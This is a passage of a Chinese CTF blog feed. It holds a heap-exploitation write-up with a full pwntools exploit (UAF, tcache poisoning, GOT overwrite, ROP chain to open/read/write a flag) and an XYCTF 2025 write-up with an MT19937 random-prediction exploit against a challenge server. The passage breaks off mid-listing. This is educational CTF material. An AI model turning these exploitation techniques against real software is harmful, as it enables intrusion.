cfc_level_1</h2><ul><li>由于这是在本地打的，但是我使用<code>glibc-all-in-one</code>找不到对应的<code>glibc2.31</code>，只能用其他版本的<code>glibc2.31</code>，所以偏移会有所不同。</li></ul><p><img src="/2025/04/23/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86ORW/image-20250422083959917.png" alt="image-20250422083959917"></p><ul><li>先运行一下这个程序，看看程序的大致逻辑。一开始运行的时候，我们会发现是一个堆菜单。但是在这个菜单中并没有<code>show</code>这个选项，即将内容输出。</li></ul><p><img src="/2025/04/23/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86ORW/image-20250421151600694.png" alt="image-20250421151600694"></p><ul><li><code>1.Add</code>选项如下，这个程序<code>add</code>堆块的<code>size</code>大小必须为<code>32</code>。</li></ul><p><img src="/2025/04/23/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86ORW/image-20250421151732091.png" alt="image-20250421151732091"></p><ul><li><code>2.Edit</code>这个选项比较平常</li></ul><p><img src="/2025/04/23/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86ORW/image-20250421151848756.png" alt="image-20250421151848756"></p><ul><li><code>3.Free</code>这个选项运行来看也比较平常</li></ul><p><img src="/2025/04/23/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86ORW/image-20250421151932578.png" alt="image-20250421151932578"></p><ul><li>然后再查看一下程序的保护机制。这时我们发现<code>RELRO</code>没开，也就是说我们的<code>got</code>表是可以写的。并且程序的<code>PIE</code>是没有开启的。</li></ul><p><img src="/2025/04/23/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86ORW/image-20250421151953592.png" alt="image-20250421151953592"></p><ul><li>接下来我们就逆向一下这个程序，先来查看一下这个程序的<code>main</code>函数。这个逆向的过程就不再一步一步逆了。直接给出逆向好的一些函数名称。<ul><li>发现该程序一开始就已经开启了沙箱</li><li>之后就是这个程序的堆菜单的主要运行逻辑。</li><li>我们还注意到，程序中并没有输出堆块内容的相关函数，但是有出现一个<code>my_write()</code>这个函数，这个函数就是用来输出一些内容的。</li></ul></li></ul><p><img src="/2025/04/23/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86ORW/image-20250421152315310.png" alt="image-20250421152315310"></p><ul><li>先来看看沙箱的禁用情况。发现只是把<code>execve</code>给禁用掉。<code>ORW</code>相关的一个都没被禁用</li></ul><p><img src="/2025/04/23/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86ORW/image-20250421152439763.png" alt="image-20250421152439763"></p><ul><li>接下来查看<code>add()</code>函数：发现程序可以申请<code>0x20</code>个堆块，申请的每个堆块地址都会被放在<code>idx</code>这个全局数组中</li></ul><p><img src="/2025/04/23/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86ORW/image-20250421152644878.png" alt="image-20250421152644878"></p><ul><li>我们查看一下<code>idx</code>这个全局数组，发现实际上这个全局数组只能存储<code>4</code>个堆块地址，由于后面的程序段也是可以写的，所以这边存在数组越界（但是并没有什么大作用）</li></ul><p><img src="/2025/04/23/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86ORW/image-20250421152808626.png" alt="image-20250421152808626"></p><ul><li>接下来我们查看一下<code>edit()</code>这个函数<ul><li>选择一个索引小于等于4的堆块</li><li>向堆块写入数据，但是并不存在堆溢出</li></ul></li></ul><p><img src="/2025/04/23/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86ORW/image-20250421153136662.png" alt="image-20250421153136662"></p><ul><li>最后我们查看<code>delete()</code>函数，这个时候发现我们只能释放索引小于等于4的堆块。并且注意到这里存在<code>UAF</code>漏洞。还注意到题目给的是<code>glibc2.31</code>的版本。</li></ul><p><img src="/2025/04/23/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86ORW/image-20250421153240381.png" alt="image-20250421153240381"></p><h2 id="cfc_level_2"><a class="markdownIt-Anchor" href="#cfc_level_2"></a> cfc_level_2</h2><ul><li>由于这个是<code>glibc2.31</code>版本的堆，并且我们只能申请到<code>tcache_bin</code>范围内的堆块。所以很明确，这题就是<code>tcachebin_attack</code>。</li><li></li></ul><h2 id="cfc_exp"><a class="markdownIt-Anchor" href="#cfc_exp"></a> cfc_exp</h2><ul><li>最终的<code>exp</code>如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/myheart/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size=<span class="number">32</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Idx&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Content:&#x27;</span>,context)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Idx&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rop_x</span>(<span class="params">stack,rop</span>):</span><br><span class="line">    edit(<span class="number">4</span>,p64(<span class="number">0</span>)*<span class="number">0x2</span>+p64(stack))</span><br><span class="line">    edit(<span class="number">0</span>,rop)</span><br><span class="line">    </span><br><span class="line">add()<span class="comment"># 0</span></span><br><span class="line">add()<span class="comment"># 1</span></span><br><span class="line">add()<span class="comment"># 2</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x4035A0</span>-<span class="number">0x10</span>))</span><br><span class="line"><span class="comment">#edit(1,p64(0x4034E0))</span></span><br><span class="line">add()<span class="comment"># 3</span></span><br><span class="line">add()<span class="comment"># 4 </span></span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0</span>)*<span class="number">0x2</span>+p64(<span class="number">0x4034E0</span>)+p64(<span class="number">0x4034F0</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x4012D1</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">write_addr = p.recvline()[<span class="number">1</span>:<span class="number">7</span>]</span><br><span class="line">write_addr = <span class="built_in">int</span>.from_bytes(write_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;write--&gt;&#x27;</span>,<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc_addr = write_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">free_hook = libc_addr + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">free_addr = libc_addr + libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">environ = libc_addr + libc.symbols[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line"><span class="comment">#libc_argv = libc.symbols[&#x27;__libc_argv&#x27;]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_addr--&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;free_hook--&gt;&#x27;</span>,<span class="built_in">hex</span>(free_hook))</span><br><span class="line"><span class="comment">#edit(0,p64(free_addr))</span></span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0</span>)*<span class="number">0x2</span>+p64(free_hook)+p64(<span class="number">0</span>))</span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0</span>)*<span class="number">0x2</span>+p64(environ)+<span class="string">b&#x27;./flag\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#edit(3,p64(0x4012D1))</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">stack_addr = p.recvline()[<span class="number">1</span>:<span class="number">7</span>]</span><br><span class="line">stack_addr = <span class="built_in">int</span>.from_bytes(stack_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stack---&gt;&#x27;</span>,<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">ret_addr = stack_addr -<span class="number">0x100</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ret_addr--&gt;&#x27;</span>,<span class="built_in">hex</span>(ret_addr))</span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x5aa48</span> + libc_addr</span><br><span class="line">pop_rdi = <span class="number">0x401833</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x401831</span></span><br><span class="line">pop_rdx_r12 = libc_addr + <span class="number">0x11c1e1</span></span><br><span class="line">flag_addr = <span class="number">0x4035A0</span>+<span class="number">0x8</span></span><br><span class="line">open_addr = libc_addr + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_addr + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_addr + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="comment"># open(./flag,)</span></span><br><span class="line">rop_x(ret_addr,p64(pop_rdi)+p64(flag_addr))</span><br><span class="line">rop_x(ret_addr+<span class="number">0x10</span>,p64(pop_rsi_r15)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>))</span><br><span class="line">rop_x(ret_addr+<span class="number">0x28</span>,p64(pop_rdx_r12)+p64(<span class="number">0x0180</span>)+p64(<span class="number">0</span>))</span><br><span class="line">rop_x(ret_addr+<span class="number">0x40</span>,p64(open_addr))</span><br><span class="line"><span class="comment"># read(3,0x4035A0+0x500,0x50)</span></span><br><span class="line">rop_x(ret_addr+<span class="number">0x48</span>,p64(pop_rdi)+p64(<span class="number">3</span>))</span><br><span class="line">rop_x(ret_addr+<span class="number">0x58</span>,p64(pop_rsi_r15)+p64(<span class="number">0x4035A0</span>+<span class="number">0x500</span>)+p64(<span class="number">0</span>))</span><br><span class="line">rop_x(ret_addr+<span class="number">0x70</span>,p64(pop_rdx_r12)+p64(<span class="number">0x50</span>)+p64(<span class="number">0</span>))</span><br><span class="line">rop_x(ret_addr+<span class="number">0x88</span>,p64(read_addr))</span><br><span class="line"><span class="comment"># write(1,0x4035A0+0x500,0x50)</span></span><br><span class="line">rop_x(ret_addr+<span class="number">0x90</span>,p64(pop_rdi)+p64(<span class="number">1</span>))</span><br><span class="line">rop_x(ret_addr+<span class="number">0xa0</span>,p64(pop_rsi_r15)+p64(<span class="number">0x4035A0</span>+<span class="number">0x500</span>)+p64(<span class="number">0</span>))</span><br><span class="line">rop_x(ret_addr+<span class="number">0xb8</span>,p64(pop_rdx_r12)+p64(<span class="number">0x50</span>)+p64(<span class="number">0</span>))</span><br><span class="line">rop_x(ret_addr+<span class="number">0xd0</span>,p64(write_addr))</span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0</span>)*<span class="number">0x2</span>+p64(<span class="number">0x4034E0</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(free_addr))</span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0</span>)*<span class="number">0x2</span>+p64(free_hook))</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_addr + <span class="number">0x276e2</span>))</span><br><span class="line">rop_x(ret_addr-<span class="number">0x18</span>,p64(libc_addr + <span class="number">0x58d38</span>))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="利用magic-gadget"><a class="markdownIt-Anchor" href="#利用magic-gadget"></a> 利用magic gadget</h1><h2 id="glibc227及以下"><a class="markdownIt-Anchor" href="#glibc227及以下"></a> glibc2.27及以下</h2><h2 id="glibc229"><a class="markdownIt-Anchor" href="#glibc229"></a> glibc2.29</h2><h2 id="glibc231"><a class="markdownIt-Anchor" href="#glibc231"></a> glibc2.31</h2>]]></content>
    
    
    <summary type="html">前言：好久没更新了，更新一下</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>2025XYCTF-wp</title>
    <link href="http://iyheart.github.io/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/"/>
    <id>http://iyheart.github.io/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/</id>
    <published>2025-04-14T09:05:36.000Z</published>
    <updated>2025-05-20T12:26:41.781Z</updated>
    
    <content type="html"><![CDATA[<h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> MISC</h1><h2 id="xgctf"><a class="markdownIt-Anchor" href="#xgctf"></a> XGCTF</h2><ul><li>题目简介</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250405020315379.png" alt="image-20250405020315379"></p><ul><li>根据题目告诉我们的内容，我们先要去<code>ctfshow</code>找到西瓜杯的<code>web</code>方向，然后找到对应的题目</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250405020501339.png" alt="image-20250405020501339"></p><ul><li>找到对应题目后我们还要去寻找<code>dragonkeep</code>师傅的博客，很容易找到</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250405020619675.png" alt="image-20250405020619675"></p><ul><li>找到后我们就利用博客的搜索引擎搜索题目关键字，这时我们就可以搜索到这样一个文章</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250405020731675.png" alt="image-20250405020731675"></p><ul><li>点击，跳转到这个文章，然后按<code>f12</code>，搜索<code>flag</code>，就会发现base64编码过后的<code>flag</code>，解码即可得到</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250405020818651.png" alt="image-20250405020818651"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1t<span class="built_in">_</span>I3<span class="built_in">_</span>t3E<span class="built_in">_</span>s@Me<span class="built_in">_</span>ChAl1eNge<span class="built_in">_</span>aT<span class="built_in">_</span>a1L<span class="built_in">_</span>P1e@se<span class="built_in">_</span>fOrg1ve<span class="built_in">_</span>Me&#125;</span><br></pre></td></tr></table></figure><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="division"><a class="markdownIt-Anchor" href="#division"></a> Division</h2><ul><li>题目描述如下：</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250405021022138.png" alt="image-20250405021022138"></p><ul><li>接下来我们就来查看一下题目附件，题目附件如下：<ul><li>该程序要给用户提供俩个选择，第一个选择是程序生成一个随机数，然后用户输入除数，计算出整除结果。程序使用<code>random.getrandbits</code>生成的随机数</li><li>第二个选择是让我们输入一个数，如果这个数等于俩个随机数生成出来整除的结果，那么我们就能得到flag。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   server.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/20 12:25:03</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----Welcome to my division calc----&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">menu:</span></span><br><span class="line"><span class="string">      [1]  Division calc</span></span><br><span class="line"><span class="string">      [2]  Get flag</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    choose = <span class="built_in">input</span>(<span class="string">&#x27;: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> choose == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            denominator = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;input the denominator: &gt;&gt;&gt; &#x27;</span>))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;INPUT NUMBERS&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        nominator = random.getrandbits(<span class="number">32</span>)</span><br><span class="line">        <span class="keyword">if</span> denominator == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;NO YOU DONT&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;nominator&#125;</span>//<span class="subst">&#123;denominator&#125;</span> = <span class="subst">&#123;nominator//denominator&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> choose == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ans = <span class="built_in">input</span>(<span class="string">&#x27;input the answer: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">            rand1 = random.getrandbits(<span class="number">11000</span>)</span><br><span class="line">            rand2 = random.getrandbits(<span class="number">10000</span>)</span><br><span class="line">            correct_ans = rand1 // rand2</span><br><span class="line">            <span class="keyword">if</span> correct_ans == <span class="built_in">int</span>(ans):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;WOW&#x27;</span>)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;Here is your flag: <span class="subst">&#123;f.read()&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;NOPE, the correct answer is <span class="subst">&#123;correct_ans&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;INPUT NUMBERS&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Invalid choice&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>这一题并没有什么命令执行之类的逃逸，而是对伪随机数进行破解，在网上搜索到这篇文章：[<a href="https://www.cnblogs.com/wandervogel/p/16805983.html">GKCTF2021]random - 明客 - 博客园</a></li><li>有相关题目，这个题目讲的就是<code>random.getrandbits</code>这个伪随机数的生成方式，即<code>MT19937伪随机数生成算法</code>。从文章中得知，我们需要知道<code>624</code>个<code>uint32</code>位的生成随机数，我们才能预测下一个随机数生成的结果。</li><li>这时我们就可以利用上面<code>python</code>程序的选项1，接收<code>624</code>个<code>32</code>位的数据，然后通过算法进行预测。</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250405021551535.png" alt="image-20250405021551535"></p><ul><li><p>文章还介绍了动手写<code>MT19937伪随机数生成算法</code>的预测，或者是直接使用<code>randcrack</code>这个库进行一把梭。这里我选用的是<code>randcrack</code>库一把梭。</p></li><li><p>exp如下：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;47.94.15.198&#x27;</span>,<span class="number">22602</span>)</span><br><span class="line"><span class="built_in">list</span> = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;denominator: &gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">    count = p.recvline().split(<span class="string">b&#x27;//&#x27;</span>)[<span class="number">0</span>][<span class="number">1</span>:]</span><br><span class="line">    count = <span class="built_in">int</span>(count.decode(<span class="string">&#x27;utf-8&#x27;</span>),<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">list</span>.append(count)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)</span><br><span class="line">rc = RandCrack()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    rc.submit(i)</span><br><span class="line">rand1 = rc.predict_getrandbits(<span class="number">11000</span>)</span><br><span class="line">rand2 = rc.predict_getrandbits(<span class="number">10000</span>)</span><br><span class="line">result = rand1//rand2</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(result).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><ul><li>接收完<code>624</code>之后就可以预测了，这样我们就能得到正确的答案</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250405022345450.png" alt="image-20250405022345450"></p><ul><li>flag如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XYCTF&#123;f0765d12-ce78-4ad5-<span class="number">8905</span>-455b398d7b78&#125;</span><br></pre></td></tr></table></figure><h2 id="complex_signin"><a class="markdownIt-Anchor" href="#complex_signin"></a> Complex_signin</h2><ul><li>题目描述如下：</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250405022421118.png" alt="image-20250405022421118"></p><ul><li>题目附件如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 